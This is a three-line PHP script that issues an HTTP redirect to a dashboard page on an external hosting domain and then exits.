<?php
header("Location: https://tripweb.page.gd/part/dashboard");
exit;